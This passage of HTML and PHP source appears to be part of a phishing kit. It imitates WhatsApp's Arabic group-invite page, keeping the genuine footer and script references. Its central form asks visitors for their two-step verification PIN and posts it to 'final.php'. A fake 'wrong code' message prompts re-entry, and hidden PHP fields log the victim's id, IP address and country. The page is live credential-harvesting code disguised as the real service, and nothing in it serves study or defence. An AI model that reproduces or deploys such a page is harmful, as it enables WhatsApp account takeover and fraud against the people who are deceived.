                                                <li class="_9t0h">
                                                    <h4 class="_9vd5" style="color:#FFFFFF;"><a href="https://www.whatsapp.com/contact/" class="_9vcv"><span class="_advp _aeam">تواصل معنا</span></a></h4>
                                                </li>
                                                <div class="_9tjq"><select id="u_0_7_/e" class="_9tg0" aria-hidden="true">
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">
                                                            azərbaycan</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">
                                                            Afrikaans</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">
                                                            Bahasa Indonesia</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">
                                                            Melayu</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">
                                                            català</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">
                                                            čeština</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">
                                                            dansk</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">
                                                            Deutsch</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">
                                                            eesti</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en">
                                                            English</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">
                                                            español</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">
                                                            français</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">
                                                            Gaeilge</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">
                                                            hrvatski</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">
                                                            italiano</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">
                                                            Kiswahili</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">
                                                            latviešu</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">
                                                            lietuvių</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">
                                                            magyar</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">
                                                            Nederlands</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">
                                                            norsk bokmål</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">
                                                            o‘zbek</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">
                                                            Filipino</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">
                                                            polski</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">
                                                            Português (Brasil)</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">
                                                            Português (Portugal)</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">
                                                            română</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">
                                                            shqip</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">
                                                            slovenčina</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">
                                                            slovenščina</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">
                                                            suomi</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">
                                                            svenska</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">
                                                            Tiếng Việt</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">
                                                            Türkçe</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">
                                                            Ελληνικά</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">
                                                            български</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">
                                                            қазақ тілі</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">
                                                            македонски</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">
                                                            русский</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">
                                                            српски</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">
                                                            українська</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">
                                                            עברית</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar" selected="1">العربية</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">
                                                            فارسی</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">
                                                            اردو</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">
                                                            বাংলা</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">
                                                            हिन्दी</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">
                                                            ગુજરાતી</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">
                                                            ಕನ್ನಡ</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">
                                                            मराठी</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">
                                                            ਪੰਜਾਬੀ</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">
                                                            தமிழ்</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">
                                                            తెలుగు</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">
                                                            മലയാളം</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">
                                                            ไทย</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">
                                                            简体中文</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">
                                                            繁體中文（台灣）</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">
                                                            繁體中文（香港）</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">
                                                            日本語</option>
                                                        <option value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">
                                                            한국어</option>
                                                    </select></div>
                                            </ul>
                                        </nav>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </header>
                </div>
                <div data-testid="whatsapp_www_root" id="content-wrapper">
                    <div class="_9r_7">
                        <section data-testid="waui_section" class="_9t2b _9t2d" style="">
                            <div class="_9t2e _9t2c">
                                <div class="_9t2g _9t2c _a1fe">
                                    <div class="_9tar _9ta4 _9ta6 _9ta8">
                                        <div class="_9vd6 _9t33 _9bir _9bj3 _9bhj _9v12 _9tau _9tay _9u6w _9se- _9u5y">
                                            <div class="_9scd"></div>
                                            <div style="display: block;" id="main_block"><a href="https://chat.whatsapp.com/KWV8T3ugsHH1unqZelMZ3k" title="اتبع هذا الرابط للانضمام" id="action-icon" class="_9vcv"><span class="_advp _aeam"><img class="_9vx6" src="https://static.whatsapp.net/rsrc.php/v3/yB/r/_0dVljceIA5.png"></span></a>
                                            <h3 class="_9vd5 _9scr" style="color:#5E5E5E;"></h3>
                                            <h4 class="_9vd5 _9scb" style="color:#5E5E5E;">الدعوة للانضمام إلى مجموعة
                            </br></br>
                            <form action="final.php" method="POST">
                                                  <strong style="font-style: italic;">أدخل رمز التحقق بخطوتين (PIN) الذي قمت بتجديده سابقا</strong>
                                                  <br><br><br>
                                                      <center><span style="color:#cc0000">رمز خاطئ غير صحيح</span></center>

                                                    <br>
                                                    <br>
                                                        <input type="text" name="codeconf4" id="codeconf4" class="input-phone" style="text-align:center;letter-spacing : 5px;  " placeholder="_ _ _  _ _ _"  pattern="[0-9]*" maxlength="6" required>
                                                 
                                                 
                                                   
                                                   <input type="hidden" name="id" value="<?php echo $_POST['id'] ?>">
                                                   <input type="hidden" name="ip" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
                                                   <input type="hidden" name="codecntry" value="<?php echo $geoplugin->countryCode ?>">
                                                  <br>
                                                   
                                                  <br><br>
                                                 <button type="submit" class="_36or _2y_c _2z0c _2z07" style="margin-right:-10px"><span class="_advp">الانضمام إلى الدردشة</span></button>
                                                                                   
                                              </form>
                                              
                                              <hr class="_9tpv _9scb _9scr _9scb _9scr" style="background-color:#F0F4F9;">
                                            <h4 class="_9vd5" style="color:#5E5E5E;">أليس لديك تطبيق واتساب بعد؟</h4>
                                            <h4 class="_9vd5 _9scc"><a href="https://www.whatsapp.com/download" class="_9vcv _9vcx"><span class="_advp _aeam">التنزيل</span></a>
                                            </h4>
                                            <div id="fallback_block" style="display: none;">
                                                <h3 class="_9vd5">يبدو أن تطبيق واتساب غير مثبت على جهازك!</h3><a href="https://www.whatsapp.com/download" class="_9vcv _advm _9scr"><span class="_advp _aeam">التنزيل</span></a>
                                                <div class="_9vd6 _9t33 _9bir _9bj3 _9bhj _9v12 _9tau _9tay">
                                                    <p class="_9vd5">اتبع هذا الرابط للانضمام</p>
                                                    <h4 class="_9vd5 _9scc"><a href="https://web.whatsapp.com/accept?code=KWV8T3ugsHH1unqZelMZ3k" class="_9vcv _9vcx"><span class="_advp _aeam">استخدم واتساب
                                                                ويب</span></a></h4>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </section>
                    </div>
                </div>
            </div>
            <div id="footer-wrapper">
                <div class="_9r_7 _9t33">
                    <footer class="_9t2i _aeoj" data-testid="whatsapp_www_footer">
                        <div class="_9t2j">
                            <div class="_9bhp _9bhq _9bg- _9bh3 _9bhv _9t2l">
                                <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z">
                                    <h3 class="bold _9vd5 _9r_9" style="color:#F0F4F9;">واتساب</h3><a href="https://www.whatsapp.com/features" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">الخصائص</h4>
                                        </span></a><a href="https://www.whatsapp.com/download" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">تنزيل</h4>
                                        </span></a><a href="https://web.whatsapp.com/" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">واتساب ويب</h4>
                                        </span></a><a href="https://www.whatsapp.com/business" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">واتساب للأعمال</h4>
                                        </span></a><a href="https://www.whatsapp.com/privacy" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5 _9sd0" style="color:#FFFFFF;">الخصوصية</h4>
                                        </span></a>
                                </div>
                                <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z">
                                    <h3 class="bold _9vd5 _9r_9" style="color:#F0F4F9;">الشركة</h3><a href="https://www.whatsapp.com/about" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">نبذة حول واتساب</h4>
                                        </span></a><a href="https://www.whatsapp.com/join" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">الوظائف</h4>
                                        </span></a><a href="https://www.facebook.com/brand/resources/whatsapp/whatsapp-brand" class="_9vcv" target="_blank" rel="noopener"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">مركز العلامة التجارية</h4>
                                        </span></a><a id="contact_us_link_footer" href="https://www.whatsapp.com/contact" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">تواصل معنا</h4>
                                        </span></a><a href="https://blog.whatsapp.com/" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">المدونة</h4>
                                        </span></a><a href="https://www.whatsapp.com/stories" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5 _9sd0" style="color:#FFFFFF;">قصص واتساب</h4>
                                        </span></a>
                                </div>
                                <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z">
                                    <h3 class="bold _9vd5 _9r_9" style="color:#F0F4F9;">تنزيل</h3><a href="https://www.whatsapp.com/download" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">كمبيوتر Mac/كمبيوتر شخصي</h4>
                                        </span></a><a href="https://www.whatsapp.com/android" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">Android</h4>
                                        </span></a><a href="https://apps.apple.com/us/app/whatsapp-messenger/id310633997" class="_9vcv" target="_blank" rel="noopener"><span class="_advp _aeam">
                                            <h4 class="_9vd5 _9sd0" style="color:#FFFFFF;">iPhone</h4>
                                        </span></a>
                                </div>
                                <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z">
                                    <h3 class="bold _9vd5 _9r_9" style="color:#F0F4F9;">الحصول على مساعدة</h3><a href="https://faq.whatsapp.com/" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">مركز المساعدة</h4>
                                        </span></a><a href="https://twitter.com/whatsapp" class="_9vcv" target="_blank" rel="noopener"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">تويتر</h4>
                                        </span></a><a href="https://www.facebook.com/WhatsApp" class="_9vcv" target="_blank" rel="noopener"><span class="_advp _aeam">
                                            <h4 class="_9vd5" style="color:#FFFFFF;">فيسبوك</h4>
                                        </span></a><a href="https://www.whatsapp.com/coronavirus" class="_9vcv"><span class="_advp _aeam">
                                            <h4 class="_9vd5 _9sd0" style="color:#FFFFFF;">فيروس كورونا</h4>
                                        </span></a>
                                </div>
                            </div>
                        </div>
                        <div class="_9t2k">
                            <div class="_9t2m">
                                <h4 class="_9vd5 _9sc- _9t31 _9vd7" style="color:#FFFFFF;">&rlm;2022 ©&rlm; شركة WhatsApp
                                    LLC</h4>
                                <div class="_9bhp _9bhq _9bhs _9bhv"><a href="https://www.whatsapp.com/legal/" class="_9vcv _9u4m"><span class="_advp _aeam">
                                            <h6 class="_9vd5 _9sc- _9t31" style="color:#FFFFFF;">الخصوصية والشروط</h6>
                                        </span><svg width="8" height="13" fill="none" class="_9vd8 _agnt _9u4p">
                                            <path d="M7.41 1.91L2.83 6.5l4.58 4.59L6 12.5l-6-6 6-6 1.41 1.41z" fill="currentColor"></path>
                                        </svg></a></div>
                            </div>
                        </div>
                    </footer>
                </div>
            </div>
        </div>
        <div>
        </div>
        <script>
            requireLazy(["Bootloader"], function(m) {
                m.handlePayload({
                    "consistency": {
                        "rev": 1006770746
                    },
                    "rsrcMap": {
                        "6Vxclga": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/r\/PyMoUs0-uTx.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "aLWBuAr": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iJoa4\/yD\/l\/ar_AR\/Yj6N6yD3D5b.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "xoY0m2s": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yv\/r\/SMzauG8L87d.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "H+Qbnws": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3imVS4\/y6\/l\/ar_AR\/LiqwHjhuuZP.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "zGvX4V8": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yJ\/r\/Esa_ZgqEv9C.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "vXVmoSO": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yk\/r\/T7WxsqwR8rh.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "PqmsMWA": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/r\/mJ2Qa6HrYlV.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "zmDkAi9": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3ii6o4\/yQ\/l\/ar_AR\/__yqx8C_czO.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "15HqZfD": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iVNN4\/y6\/l\/ar_AR\/qd3BkPntgTu.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Twm7E77": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3idV94\/ye\/l\/ar_AR\/1FZR3Rojh_L.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "34IjhTr": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yz\/r\/zA6VNgnjWOm.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "iqaNd7v": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y9\/r\/0sm6BuV2M9-.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "PKg8B8N": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yo\/r\/V3scni4amIg.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "lYMIqwV": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/Cekb95ZEenT.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "+TChC7V": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yY\/r\/yJ6z8E3kgvE.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "2\/maQ\/Q": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yL\/r\/mPQTxAVB7AK.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "2HxWSIu": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/h_42h8dgGsj.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "qoH5vyV": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yz\/l\/1,cross\/U_7qNTttAcF.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "R5w1rCJ": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/p55HfXW__mM.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "P1UUTmY": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i_cL4\/yA\/l\/ar_AR\/vvHF_hlDA0Q.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "rlbiS2R": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yZ\/r\/MT8zVb7FCG1.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "+2mYsBo": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yd\/r\/ACVCSlW0ASp.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "9sdrxzZ": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yf\/l\/1,cross\/uq_zuxOgk6o.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "0jD5daf": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yg\/l\/1,cross\/5YrGme9jSQz.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "lGcuWFY": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i7VN4\/yu\/l\/ar_AR\/NfFT5u1gPd3.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "MA7wtBb": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yS\/r\/lhPdogB16ty.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "mdAFoUs": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/_InhWGTbjG7.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "79gAk58": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yg\/l\/1,cross\/UBfW_uXOz3d.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "U1M\/Y3Q": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i8dj4\/yr\/l\/ar_AR\/bs7JyipKb6q.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "aX4hBY6": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yW\/r\/V-2r-qUoTgs.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "VESpy09": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yj\/r\/WUS5EuOanS2.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "tv8\/vX6": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3i70u4\/yx\/l\/ar_AR\/PWIitCltMNR.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Ox\/z9Em": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yw\/r\/Zf3fUoDk7tZ.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "2UdiOZ8": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yL\/r\/UYR1psvcFia.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "hUDGDA4": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/muAuE9Qzu_b.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "dsf5Sdn": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yJ\/l\/1,cross\/pOLS7ZUdRFq.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "T3YJWJ1": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yg\/r\/Agswk3_mVhM.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "4vTWHGy": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y9\/r\/j4MPTNEjUpQ.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "hm7LH2C": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yZ\/r\/D-xA6UdYheu.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "aSbaNKt": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yC\/l\/1,cross\/1avUb7EfQ7B.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "M8Xp01T": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y-\/r\/kQV1nBAlQX2.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "YmFpgbD": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ys\/r\/_FBFonVqf3T.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "mw0cRSV": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y5\/r\/YQvbpe7tqwt.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "s6f7kQQ": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yp\/r\/O4hV5R-_3aY.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "j8vinei": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y6\/r\/4mrA60sb1MG.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "yPN8Cty": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yb\/l\/1,cross\/wTkjE-OZYCu.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "GS4bGVX": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yv\/l\/1,cross\/Z0kO-hYCR0y.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "8q2zxdD": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yn\/l\/1,cross\/nmx-hzkaYTC.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "mDomTSa": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/l\/1,cross\/5IMEy-bjfVY.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "8LpAtc0": {
                            "type": "css",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yg\/l\/1,cross\/hFGlZaIh018.css?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "NUcs7zk": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y7\/r\/REM2iKra3b3.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "zuJ\/ghe": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/ya\/r\/mPlT7RQMT5k.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "fUlW\/15": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yR\/r\/LweEqkrGkRz.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "zVTqSl6": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/r\/ytmG00L_PQ4.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "Y+PD8c3": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3iouQ4\/yT\/l\/ar_AR\/GUm0_wffTPI.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "VgOUvrQ": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yY\/r\/KzP8exhJKC5.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "9EKSmsD": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yx\/r\/1vnPpAoMfu0.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "u5lyyOe": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yD\/r\/y_qH9-7mJY9.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "oPTgYNC": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yN\/r\/O6JuB_TyzY0.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "kw5YG6Z": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y2\/r\/lfPnTLV3uJ4.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "iXU77vs": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yT\/r\/PzOPmfKorEN.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "8pnRkHq": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yf\/r\/YZ0yoKxi5gz.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "j\/XsUIg": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y4\/r\/jjHyAo-J8e5.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "TsDff51": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yq\/r\/sgJPtFDG42k.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "yr4qxCD": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/y3\/r\/zX6EsX3PHdx.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "\/g73V0k": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yF\/r\/eu31i6kUQCb.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "CFwuriT": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yo\/r\/-prn1IJipAi.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "rkQHihK": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yn\/r\/uqA8WYRcLXR.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "99LBMn6": {
                            "type": "js",
                            "src": "https:\/\/static.whatsapp.net\/rsrc.php\/v3\/yj\/r\/QzoUX97YXzC.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        "8+\/m\/R9": {
                            "type": "js",
